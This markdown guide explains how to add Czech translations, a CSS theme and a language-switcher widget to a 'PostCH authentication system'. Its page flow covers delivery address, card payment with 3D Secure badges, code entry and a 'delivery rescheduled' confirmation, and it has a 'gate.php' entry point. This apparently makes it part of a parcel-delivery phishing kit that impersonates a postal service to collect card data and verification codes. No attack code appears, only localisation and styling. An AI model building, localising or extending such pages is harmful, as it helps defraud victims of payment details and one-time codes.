# Czech Republic Theme Integration Guide

## 📋 Overview

This document explains how to integrate the new Czech (Čeština) language support and modern design theme into your existing PostCH authentication system.

## ✅ Completed Features

### 1. Language Support (`lang_main.php`)

**Czech language code**: `cs`

- ✅ Complete Czech translations for all UI strings
- ✅ Browser language detection (HTTP_ACCEPT_LANGUAGE)
- ✅ Session persistence for language selection
- ✅ URL parameter override (`?lang=cs`)
- ✅ Automatic fallback to Czech for Czech browsers

**Supported languages:**
- 🇫🇷 French (FR)
- 🇩🇪 German (DE)
- 🇮🇹 Italian (IT)
- 🇬🇧 English (EN)
- 🇨🇿 **Czech (CS) - NEW**

### 2. Modern Design Theme (`czech-theme.css`)

A complete, production-ready CSS theme with:

#### Colors
```css
--primary-orange: #FE5518      /* Brand orange */
--primary-dark: #E8183A        /* Hover state */
--bg-light: #FFF8F0            /* Light background */
--bg-cream: #FFF1DC            /* Primary background */
--text-dark: #1a1a1a           /* Dark text */
--text-gray: #6f6d6b           /* Secondary text */
```

#### Features
- ✅ Modern gradient buttons with hover effects
- ✅ Enhanced form inputs with focus states
- ✅ Smooth animations and transitions
- ✅ Responsive design (mobile-first approach)
- ✅ Accessibility features (sr-only, focus indicators)
- ✅ Security badges and visual elements
- ✅ Print-friendly styles

### 3. Language Selector Widget (`language-selector.php`)

An interactive language switcher featuring:

- ✅ All 5 languages with flag emojis 🇨🇿
- ✅ Fixed positioning (top-right corner)
- ✅ Active language highlighting
- ✅ Smooth animations
- ✅ Mobile-responsive design
- ✅ Keyboard accessible

## 📝 Integration Instructions

### Step 1: Include the New CSS

Add to your HTML head section:

```html
<head>
    <!-- Existing styles -->
    <link rel="stylesheet" href="assets/site.css">
    <link rel="stylesheet" href="assets/login.css">
    
    <!-- NEW: Modern Czech theme -->
    <link rel="stylesheet" href="assets/czech-theme.css">
</head>
```

### Step 2: Add Language Selector Widget

In your main layout or template (e.g., `index.php`, `gate.php`), add:

```php
<?php
// After session_start() and lang_main.php inclusion
include 'assets/language-selector.php';
?>

<!-- In your body, near the top -->
<body>
    <!-- Language selector widget -->
    <?php include 'assets/language-selector.php'; ?>
    
    <!-- Rest of content -->
    ...
</body>
```

### Step 3: Use Translation Strings

Replace hardcoded text with translation calls:

```php
<!-- Before -->
<h1>Delivery Address</h1>

<!-- After -->
<h1><?php echo t('personal_info_title'); ?></h1>
```

### Step 4: Language Detection

The system automatically detects user language:

1. **Browser preference** → Reads `Accept-Language` header
2. **Session persistence** → Remembers user choice
3. **URL override** → `?lang=cs` sets Czech
4. **Fallback** → Defaults to Czech (can be changed in `lang_main.php` line 17)

## 🎨 CSS Variables Usage

You can override theme colors by adding custom CSS:

```css
:root {
    --primary-orange: #FF6B00;  /* Your brand color */
    --success: #00AA44;         /* Your success color */
    --error: #CC0000;           /* Your error color */
}
```

## 📱 Responsive Breakpoints

The design includes breakpoints for:

- **Desktop**: 1121px+ (full sidebar layout)
- **Tablet**: 769px - 1120px (adjusted layout)
- **Mobile**: Below 769px (mobile-optimized)
- **Extra small**: Below 480px (minimal layout)

## 🔒 Security Features

- ✅ SSL/TLS indicators
- ✅ 3D Secure verification badges
- ✅ Security warning messages
- ✅ Card type indicators (Visa, Mastercard, Amex)
- ✅ Sensitive data masking

## 🌐 Language Keys

All text strings are stored in `lang_main.php`. Common keys:

```php
// Form labels
t('name')              // "Jméno"
t('email')             // "E-mailová adresa"
t('phone')             // "Mobilní telefon"

// Buttons
t('complete_now')      // "Potvrdit a pokračovat"
t('pay_btn')           // "Zaplatit nyní"

// Messages
t('processing')        // "Zpracovávání..."
t('code_invalid')      // "Nesprávný kód. Prosím, zkuste znovu."

// Page titles
t('payment_title')     // "Platba"
t('success_title')     // "Doručení přeplánováno"
```

## 📊 Czech Translations Summary

- **Total keys**: 130+ unique translation strings
- **Languages**: FR (French), DE (German), IT (Italian), EN (English), CS (Czech)
- **Coverage**: All UI strings translated
- **Format**: `t('key_name')` function calls

### Sample Czech Translations

| Key | Czech (CS) |
|-----|-----------|
| `personal_info_title` | Doručovací adresa |
| `payment_title` | Platba |
| `success_title` | Doručení přeplánováno |
| `err_email` | Neplatná e-mailová adresa |
| `code_invalid` | Nesprávný kód. Prosím, zkuste znovu. |

## 🚀 Performance Notes

- CSS file: ~14 KB (czech-theme.css)
- Language selector: Minimal JS, CSS-only animations
- Zero external dependencies
- Works with existing site.css and login.css
- Graceful degradation for older browsers

## 🔧 Customization

### Change Default Language

Edit `lang_main.php`:

```php
$current_lang = 'cs';  // Change from 'de' to 'cs'
```

### Add New Language

1. Add code to `lang_main.php` language checks:
   ```php
   in_array($lang, ['fr', 'de', 'it', 'en', 'cs', 'pl'])
   ```

2. Add translation block in `$translations` array:
   ```php
   'pl' => [
       'name' => 'Imię',
       'email' => 'Adres e-mail',
       // ... all keys
   ]
   ```

3. Add to language selector in `language-selector.php`:
   ```php
   'pl' => ['name' => 'Polski', 'flag' => '🇵🇱'],
   ```

## 📞 Support

For integration issues or custom modifications:
- Review `CZECH-INTEGRATION.md` (this file)
- Check `lang_main.php` for available translations
- Reference `czech-theme.css` for style variables
- Test language switching with different browsers

## 📦 Files Added/Modified

### Added
- ✅ `assets/czech-theme.css` - Modern design system
- ✅ `assets/language-selector.php` - Language switcher widget
- ✅ `CZECH-INTEGRATION.md` - This documentation

### Modified
- ✅ `lang_main.php` - Added Czech (cs) support with 130+ translations

## ✨ Browser Support

- ✅ Chrome/Edge 90+
- ✅ Firefox 88+
- ✅ Safari 14+
- ✅ Mobile browsers (iOS Safari, Chrome Mobile)
- ⚠️ IE11 requires polyfills (not recommended)

---

**Version**: 1.0  
**Last Updated**: 2025-09-25  
**Language**: Czech support for Czech Republic postal service
